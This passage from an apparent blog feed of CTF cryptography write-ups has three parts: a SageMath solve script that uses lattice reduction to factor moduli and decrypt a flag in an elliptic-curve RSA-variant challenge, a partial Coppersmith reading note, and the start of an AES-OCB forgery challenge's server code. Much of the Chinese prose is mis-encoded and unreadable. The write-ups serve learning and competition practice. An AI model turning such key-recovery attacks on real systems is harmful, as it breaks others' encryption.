- zbound \mod x$æ˜¯å°äº$x$çš„! è€Œ$y$æ˜¯ç•¥å¤§äº$x$çš„,é‚£ä¹ˆä¼šæœ‰<br>$$<br>{z \over y} =\lfloor {(p-q)\cdot \lfloor n^{1\over 4}\rceil \over 3(p+q)} \rceil +{(y(p+1)(q+1) - zbound \mod x) \over y} \approx \lfloor {(p-q)\cdot \lfloor n^{1\over 4}\rceil \over 3(p+q)} \rceil \tag 1<br>$$<br>ç¬¬äºŒé¡¹, ä¹Ÿå°±æ˜¯çœç•¥æ‰çš„é‚£ä¸ªé¡¹æ˜¯å°äº$1$çš„, æ‰€ä»¥è¿™ä¸ªçº¦ç­‰äºä¸¤è¾¹å…¶å®æ˜¯éå¸¸éå¸¸æ¥è¿‘çš„.</p><p>æˆ‘ä»¬ä¸Šé¢è®¡ç®—äº†$s = y(p+q+1) - z$, å†æ ¹æ®$(1)$å¼, å°±å¯ä»¥æœ‰<br>$$<br>{s \over y} = p + q + 1 - {z \over y} \approx p+q+1-\lfloor {(p-q)\cdot \lfloor n^{1\over 4}\rceil \over 3(p+q)} \rceil<br>$$<br>æˆ‘ä»¬å¯ä»¥æŠŠåé¢çš„$\lfloor \rceil$å…ˆå¿½ç•¥, å› ä¸ºå®ƒçš„å½±å“å¹¶ä¸å¤§. æˆ‘ä»¬è®°$K = \lfloor {s \over y} \rceil$, å¼å­ä¼šæ˜¯$p+q$å’Œ$p-q$çš„ä¸€ä¸ªå…³ç³»(å…¶å®è¿™é‡Œå·²ç»å¼$p,q$çš„ä¸€ä¸ªå…³ç³»å¼äº†, ç†è®ºä¸Šæ ¹æ®$n = pq$å·²ç»å¯ä»¥è§£æ–¹ç¨‹å¾—åˆ°$p$çš„è¿‘ä¼¼äº†, ä½†æ˜¯ä¸ºäº†è®¡ç®—ä¸Šçš„æ–¹ä¾¿, æ‰çœ‹æˆ$p+q$å’Œ$p-q$<br>$$<br>K = p+q+1-{(p-q) \cdot \lfloor n^{1\over 4}\rceil \over 3(p+q)}<br>$$<br>ç§»é¡¹, å¹¶åˆ©ç”¨$(p-q)^2 = (p+q)^2 - 4pq$,å¯ä»¥æŠŠå¼å­åŒ–æˆä¸€ä¸ªå…³äº$p+q$çš„æ–¹ç¨‹<br>$$<br>9((K-1)(p+q)-(p+q)^2 )^2 - n^{1 \over 2}((p+q)^2 - 4n) = 0 \\<br>9X^2(K-X-1)^2 - n^{1 \over 2}(X^2 - 4n) = 0<br>$$<br>ä½†æ˜¯å‰é¢ç”¨äº†å¤ªå¤šçš„è¿‘ä¼¼, å¯¼è‡´è¿™ä¸ªæ–¹ç¨‹çš„è§£ä¼šåç¦»çœŸæ­£çš„$p+q$å¹¶ä¸”ä¸å†æ˜¯æ•´æ•°è§£(è¿™é‡Œæˆ‘è¯•äº†sageè‡ªå¸¦çš„è§£æ–¹ç¨‹, å¯èƒ½æ˜¯æˆ‘å§¿åŠ¿ä¸å¯¹, è§£å‡ºæ¥çš„ç»“æœå†å–æ•´å¹¶ä¸æ˜¯æ­£ç¡®çš„), è§‚å¯Ÿåˆ°å½“$X = K$å’Œ$X=0$çš„æ—¶å€™å·¦è¾¹çš„å¼å­æ˜¯å¼‚å·çš„, è¿™ä¸ªæ—¶å€™å°±å¯ä»¥åˆ©ç”¨é«˜ä¸­çš„çŸ¥è¯†! æ ¹å­˜åœ¨æ€§å®šç†, å¹¶ç”¨äºŒåˆ†æ³•å»é€¼è¿‘ä¸€ä¸ªé è¿‘è§£çš„æ•´æ•°$X_0$. </p><p>è€Œè¿™ä¸ª$X_0 \approx p+q $, åˆ©ç”¨è¿™ä¸ª$X_0$å°±å¯ä»¥å¤§æ¦‚ç‡çš„è§£å‡º$p,q$äº†</p><blockquote><p>å› ä¸º$X_0$åªæ˜¯ä¸ªè¿‘ä¼¼, è€Œä¸”æ±‚å‡ºæ¥è¿˜å¯èƒ½æ˜¯å¥‡æ•°, æ‰€ä»¥éœ€è¦å‰åè°ƒä¸€ä¸‹, æ¯”å¦‚+1 -1 +2 -2 ç­‰ç­‰<br>å…³äºä¸ºå•¥ä¸èƒ½æ˜¯å¥‡æ•°, $p+q$æ€ä¹ˆä¼šæ˜¯å¥‡æ•°å‘¢hhh</p></blockquote><p>è‡³æ­¤, æˆ‘ä»¬æˆåŠŸçš„ç®—å‡ºäº†$p,q$, æ‰€æœ‰çš„å‚æ•°åŒ…æ‹¬ç§é’¥ä¹Ÿéƒ½å¯ä»¥æ±‚å‡ºæ¥äº†, å†åˆ©ç”¨é¢˜ç›®è‡ªå¸¦çš„è§£å¯†ç®—æ³•è§£å¯†å°±è¡Œäº†.</p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sagemath</span></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes <span class="keyword">as</span> l2b</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_p_puls_q</span>(<span class="params">f,k</span>):</span></span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line">    b = k</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):</span><br><span class="line">        a = (s+b) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> f.subs(x==a) &gt; <span class="number">0</span>:</span><br><span class="line">            s = a </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            b = a</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_p</span>(<span class="params">pq,n</span>):</span></span><br><span class="line">    p = var(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> pq^<span class="number">2</span> - <span class="number">4</span>*n&lt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    f = p^<span class="number">2</span> - pq*p+n</span><br><span class="line">    r = f.roots()</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> r:</span><br><span class="line">        <span class="keyword">if</span> i[<span class="number">0</span>]&gt;<span class="number">0</span>:</span><br><span class="line">            res.append(<span class="built_in">int</span>(i[<span class="number">0</span>]))</span><br><span class="line">    <span class="keyword">return</span> (res[<span class="number">0</span>],res[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">c, d, n</span>):</span></span><br><span class="line">    n = <span class="built_in">int</span>(n)</span><br><span class="line">    size = n.bit_length() // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    c_high, c_low = c</span><br><span class="line">    b = (c_low**<span class="number">2</span> - c_high**<span class="number">3</span>) % n</span><br><span class="line">    EC = EllipticCurve(Zmod(n), [<span class="number">0</span>, b])</span><br><span class="line">    m_high, m_low = (EC((c_high, c_low)) * d).xy()</span><br><span class="line">    m_high, m_low = <span class="built_in">int</span>(m_high), <span class="built_in">int</span>(m_low)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (m_high &lt;&lt; size) | m_low</span><br><span class="line"></span><br><span class="line">masked_flag =  <span class="number">10629883656219490982178951599484437698263214790268091560719514148215968944141123323489358824379735126966804354267426040231682908197526817342035901781691470</span></span><br><span class="line">ciphertexts =  [...]</span><br><span class="line"></span><br><span class="line">PK = []</span><br><span class="line">N = [ciphertexts[<span class="number">0</span>][<span class="string">&#x27;n&#x27;</span>],ciphertexts[<span class="number">1</span>][<span class="string">&#x27;n&#x27;</span>],ciphertexts[<span class="number">2</span>][<span class="string">&#x27;n&#x27;</span>]]</span><br><span class="line">E = [ciphertexts[<span class="number">0</span>][<span class="string">&#x27;e&#x27;</span>],ciphertexts[<span class="number">1</span>][<span class="string">&#x27;e&#x27;</span>],ciphertexts[<span class="number">2</span>][<span class="string">&#x27;e&#x27;</span>]]</span><br><span class="line">C = [ciphertexts[<span class="number">0</span>][<span class="string">&#x27;c&#x27;</span>],ciphertexts[<span class="number">1</span>][<span class="string">&#x27;c&#x27;</span>],ciphertexts[<span class="number">2</span>][<span class="string">&#x27;c&#x27;</span>]]</span><br><span class="line"></span><br><span class="line">M=iroot(<span class="built_in">int</span>(N[<span class="number">0</span>]),<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">a=[<span class="number">0</span>]*<span class="number">4</span></span><br><span class="line">a[<span class="number">0</span>]=[M,E[<span class="number">0</span>],E[<span class="number">1</span>],E[<span class="number">2</span>]]</span><br><span class="line">a[<span class="number">1</span>]=[<span class="number">0</span>,-N[<span class="number">0</span>],<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">a[<span class="number">2</span>]=[<span class="number">0</span>,<span class="number">0</span>,-N[<span class="number">1</span>],<span class="number">0</span>]</span><br><span class="line">a[<span class="number">3</span>]=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,-N[<span class="number">2</span>]]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mat = matrix(ZZ,a)</span><br><span class="line">Mat_LLL=Mat.LLL()</span><br><span class="line">x = <span class="built_in">int</span>(<span class="built_in">abs</span>(Mat_LLL[<span class="number">0</span>][<span class="number">0</span>])//M)</span><br><span class="line"><span class="keyword">assert</span> x * M == <span class="built_in">abs</span>(Mat_LLL[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">S=[Mat_LLL[<span class="number">0</span>][<span class="number">1</span>],Mat_LLL[<span class="number">0</span>][<span class="number">2</span>],Mat_LLL[<span class="number">0</span>][<span class="number">3</span>]]</span><br><span class="line">A=[<span class="built_in">round</span>(N[<span class="number">0</span>]^<span class="number">0.25</span>)^<span class="number">2</span>,<span class="built_in">round</span>(N[<span class="number">1</span>]^<span class="number">0.25</span>)^<span class="number">2</span>,<span class="built_in">round</span>(N[<span class="number">2</span>]^<span class="number">0.25</span>)^<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> (E[<span class="number">0</span>] * x - S[<span class="number">0</span>]) % N[<span class="number">0</span>] == <span class="number">0</span></span><br><span class="line"><span class="keyword">assert</span> (E[<span class="number">1</span>] * x - S[<span class="number">1</span>]) % N[<span class="number">1</span>] == <span class="number">0</span></span><br><span class="line"><span class="keyword">assert</span> (E[<span class="number">2</span>] * x - S[<span class="number">2</span>]) % N[<span class="number">2</span>] == <span class="number">0</span></span><br><span class="line">Y = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    Y[i] = (E[i]*x - S[i]) // N[i]</span><br><span class="line">KK = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    KK[i] = (E[i] * x -Y[i] * N[i] ) // Y[i]</span><br><span class="line"></span><br><span class="line">x = var(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">FF = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    FF[i] = (<span class="number">3</span>*(KK[i]-<span class="number">1</span>)*x-<span class="number">3</span>*x^<span class="number">2</span>)^<span class="number">2</span> - A[i]*(x^<span class="number">2</span>-<span class="number">4</span>*N[i])</span><br><span class="line">ppq1 = find_p_puls_q(FF[<span class="number">0</span>],KK[<span class="number">0</span>])</span><br><span class="line">ppq2 = find_p_puls_q(FF[<span class="number">1</span>],KK[<span class="number">1</span>])</span><br><span class="line">ppq3 = find_p_puls_q(FF[<span class="number">2</span>],KK[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">p1,q1 = find_p(ppq1+<span class="number">1</span>,N[<span class="number">0</span>])</span><br><span class="line">p2,q2 = find_p(ppq2+<span class="number">1</span>,N[<span class="number">1</span>])</span><br><span class="line">p3,q3 = find_p(ppq3+<span class="number">1</span>,N[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">d1,d2,d3 = inverse_mod(E[<span class="number">0</span>],(p1+<span class="number">1</span>)*(q1+<span class="number">1</span>)),inverse_mod(E[<span class="number">1</span>],(p2+<span class="number">1</span>)*(q2+<span class="number">1</span>)),inverse_mod(E[<span class="number">2</span>],(p3+<span class="number">1</span>)*(q3+<span class="number">1</span>))</span><br><span class="line">l2b(decrypt(C[<span class="number">0</span>],d1,N[<span class="number">0</span>])^^decrypt(C[<span class="number">1</span>],d2,N[<span class="number">1</span>])^^decrypt(C[<span class="number">2</span>],d3,N[<span class="number">2</span>])^^masked_flag)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;å•Šå¤ªèœäº†å¤ªèœäº†â€¦æ‰“è¿™CTFä¹Ÿæœ‰åŠå¹´äº†,è¿˜æ˜¯è¿™ä¹ˆèœ,å¥½æƒ³æœ‰ä¸€æ¬¡èƒ½akå•Šâ€¦..&lt;br&gt;ä¸¤é“é¢˜ä¸€é¢˜æ‰‹å¿«æ‰¾åˆ°èµ„æ–™æ‹¿äº†ä¸ªä¸‰è¡€, å¦å¤–ä¸€é¢˜åšäº†åŠå¤©éƒ½æ²¡å‡ºæ¥, æœ‰æ¡å…³ç³»å¼ç†è§£é”™äº†çœŸçš„æƒ³é”¤äººâ€¦.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;0x00-cub</summary>
      
    
    
    
    <category term="WriteUp" scheme="http://tearsjin.github.io/categories/WriteUp/"/>
    
    
    <category term="Crypto" scheme="http://tearsjin.github.io/tags/Crypto/"/>
    
    <category term="ECC" scheme="http://tearsjin.github.io/tags/ECC/"/>
    
  </entry>
  
  <entry>
    <title>Finding Small Solutions to Small Degree Polynomials</title>
    <link href="http://tearsjin.github.io/2021/04/04/Finding-Small-Solutions-to-Small-Degree-Polynomials/"/>
    <id>http://tearsjin.github.io/2021/04/04/Finding-Small-Solutions-to-Small-Degree-Polynomials/</id>
    <published>2021-04-04T07:57:17.000Z</published>
    <updated>2021-04-04T12:38:53.471Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p> Finally, Coppersmith!</p></blockquote><h1 id="Finding-Small-Solutions-to-Small-Degree-Polynomials"><a href="#Finding-Small-Solutions-to-Small-Degree-Polynomials" class="headerlink" title="Finding Small Solutions to Small Degree Polynomials"></a>Finding Small Solutions to Small Degree Polynomials</h1><h2 id="Univariate-Modular-Polynomial"><a href="#Univariate-Modular-Polynomial" class="headerlink" title="Univariate Modular Polynomial"></a>Univariate Modular Polynomial</h2><p>The definition of â€œsmall rootsâ€: All integers $x_0$ such that $|x_0| &lt; B$ and $p(x_0)=0\mod N$, where B is a suitable bound of $x_0$ and $p(x)$ is a univariate polynomial of small degree, $N$ is a modulus of unknown factorization.</p><p>We assume $p$ is monic and the gcd of its coefficients be relatively prime to $N$. We set:<br>$$<br>p(x) = x^d + p_{d-1}x^{d-1} + \cdots + p_2x^2 + p_1x + p_0<br>$$<br>The first approach is essentially due to Hastad. We can take attention to one collection $C_1$ of polynomials:<br>$$<br>C_1 = \{x_i,0 \le i &lt; d\} \cup \{p(x)/N\}<br>$$<br>For each polynomials $q \in C_1$ , and all small root $x_0$, $q(x_0)$ is an integer. The same will be the true of any integer linear combination of polynomials in $C_1$.</p><p>And we can get a lattice<br>$$<br>L =<br>\begin{pmatrix}<br>1&amp;0&amp;0&amp; \cdots&amp;0&amp;0&amp;p_0 /N \\<br>0&amp;B&amp;0&amp; \cdots&amp;0&amp;0&amp;p_1 /N \\<br>0&amp;0&amp;B^2&amp;\cdots&amp;0&amp;0&amp;p_2/N \\<br>&amp;&amp;&amp;\vdots \\<br>0&amp;0&amp;0&amp;\cdots&amp;B^{d-2}&amp;0p_{d-2}B^{d-2}/N \\<br>0&amp;0&amp;0&amp;\cdots&amp;0&amp;B^{d-1}&amp;p_{d-1}B^{d-1}/N \\<br>0&amp;0&amp;0&amp;\cdots&amp;0&amp;0&amp;B^d/N<br>\end{pmatrix}<br>$$<br>Apply lattice basis reduction. Because $L_1$ has dimension $d+1$ and determinant $N^{-1}B^{d(d+1)/2}$, we will find a nonzero vector $v$ of length<br>$$<br>|v| &lt; c_1(d)det(L_1)^{1/(d+1)} = c_1N^{-1/(d+1)}B^{d/2},<br>$$<br>where $c_1(d)$ is a constant depending on the dimension.</p><p>We interpret a vector $\mathbb v = (v_0,v_1B,\cdots,v_dB^d)$ as a polynomial $v(x)  = \sum v_ix^i$.</p><blockquote><p>I can not understand â€¦<br>to be continued</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt; Finally, Coppersmith!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;Finding-Small-Solutions-to-Small-Degree-Polynomials&quot;&gt;&lt;a href=&quot;#Finding-Smal</summary>
      
    
    
    
    <category term="Reading notes" scheme="http://tearsjin.github.io/categories/Reading-notes/"/>
    
    
    <category term="Reading" scheme="http://tearsjin.github.io/tags/Reading/"/>
    
    <category term="Coppersmith" scheme="http://tearsjin.github.io/tags/Coppersmith/"/>
    
  </entry>
  
  <entry>
    <title>writeup for 2020 çº¢æ˜è°·æ¯</title>
    <link href="http://tearsjin.github.io/2021/04/02/writeup-for-2020-%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF/"/>
    <id>http://tearsjin.github.io/2021/04/02/writeup-for-2020-%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF/</id>
    <published>2021-04-02T11:35:01.000Z</published>
    <updated>2021-04-29T11:04:29.665Z</updated>
    
    <content type="html"><![CDATA[<p>è™ç¬¦å‰çš„ä¸€ä¸ªæ¯”èµ›, å·éƒ½æ²¡æ³¨å†Œ, å€Ÿéš”å£å®¿èˆçš„å·ç©äº†ä¸€ä¸‹. å¯†ç ä¸€å…±å°±ä¸‰é¢˜, ä¸€é¢˜AES-OCBéš¾çˆ†(åæ­£æˆ‘æ˜¯ç¬¬ä¸€æ¬¡çŸ¥é“OCBè¿™ä¸ªæ¨¡å¼), å›½å†…å±…ç„¶æœä¸åˆ°å…³äºOCBçš„èµ„æ–™. åªæ‰¾åˆ°ä¸€ä¸¤ä¸ªpaper, æ²¡è¿™ä¸ªè€å¿ƒçœ‹. å‰©ä¸‹ä¸¤é¢˜, ä¸€é¢˜ç­¾åˆ°(ä¼°è®¡æ˜¯éé¢„æœŸæ‰è¿™ä¹ˆç®€å•), è¿˜æœ‰ä¸€é“Laçˆ·çˆ·é‚£è¾¹æœ‰è®°å½•, å°±ç›´æ¥åšäº†.</p><h1 id="0x00-babyForgery"><a href="#0x00-babyForgery" class="headerlink" title="0x00 babyForgery"></a>0x00 babyForgery</h1><h2 id="problem"><a href="#problem" class="headerlink" title="problem"></a>problem</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> ocb.aes <span class="keyword">import</span> AES <span class="comment"># https://github.com/kravietz/pyOCB</span></span><br><span class="line"><span class="keyword">from</span> ocb <span class="keyword">import</span> OCB</span><br><span class="line"></span><br><span class="line">FLAG = <span class="comment">#####REDACTED#####</span></span><br><span class="line"></span><br><span class="line">BLOCKSIZE = <span class="number">16</span></span><br><span class="line">MENU = <span class="string">br&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">[1] Encrypt</span></span><br><span class="line"><span class="string">[2] Decrypt</span></span><br><span class="line"><span class="string">[3] Get Flag</span></span><br><span class="line"><span class="string">[4] Exit</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>(<span class="params">socketserver.BaseRequestHandler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_recvall</span>(<span class="params">self</span>):</span></span><br><span class="line">       <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send</span>(<span class="params">self, msg, newline=<span class="literal">True</span></span>):</span></span><br><span class="line">       <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recv</span>(<span class="params">self, prompt=<span class="string">b&#x27;&gt; &#x27;</span></span>):</span></span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recvhex</span>(<span class="params">self, prompt=<span class="string">b&#x27;&gt; &#x27;</span></span>):</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>(<span class="params">self</span>):</span></span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">timeout_handler</span>(<span class="params">self, signum, frame</span>):</span></span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">self, nonce, message, associate_data=<span class="string">b&#x27;&#x27;</span></span>):</span></span><br><span class="line">        <span class="keyword">assert</span> nonce <span class="keyword">not</span> <span class="keyword">in</span> self.NONCEs</span><br><span class="line">        self.NONCEs.add(nonce)</span><br><span class="line">        self.ocb.setNonce(nonce)</span><br><span class="line">        tag, cipher = self.ocb.encrypt(<span class="built_in">bytearray</span>(message), <span class="built_in">bytearray</span>(associate_data))</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">bytes</span>(cipher), <span class="built_in">bytes</span>(tag))</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">self, nonce, cipher, tag, associate_data=<span class="string">b&#x27;&#x27;</span></span>):</span></span><br><span class="line">        self.ocb.setNonce(nonce)</span><br><span class="line">        authenticated, message = self.ocb.decrypt(</span><br><span class="line">            *<span class="built_in">map</span>(<span class="built_in">bytearray</span>, (associate_data, cipher, tag))</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> authenticated:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;REJECT&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(message)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span>(<span class="params">self</span>):</span></span><br><span class="line">        signal.signal(signal.SIGALRM, self.timeout_handler)</span><br><span class="line">        signal.alarm(<span class="number">60</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.proof_of_work():</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        aes = AES(<span class="number">128</span>)</span><br><span class="line">        self.ocb = OCB(aes)</span><br><span class="line">        KEY = os.urandom(BLOCKSIZE)</span><br><span class="line">        self.ocb.setKey(KEY)</span><br><span class="line">        self.NONCEs = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            USERNAME = self.recv(prompt=<span class="string">b&#x27;Enter username &gt; &#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(USERNAME) &gt; BLOCKSIZE:</span><br><span class="line">                self.send(<span class="string">b&quot;I can&#x27;t remember long names&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> USERNAME == <span class="string">b&#x27;Alice&#x27;</span>:</span><br><span class="line">                self.send(<span class="string">b&#x27;Name already used&#x27;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        signal.alarm(<span class="number">60</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            self.send(MENU, newline=<span class="literal">False</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                choice = <span class="built_in">int</span>(self.recv(prompt=<span class="string">b&#x27;Enter option &gt; &#x27;</span>))</span><br><span class="line"></span><br><span class="line">                <span 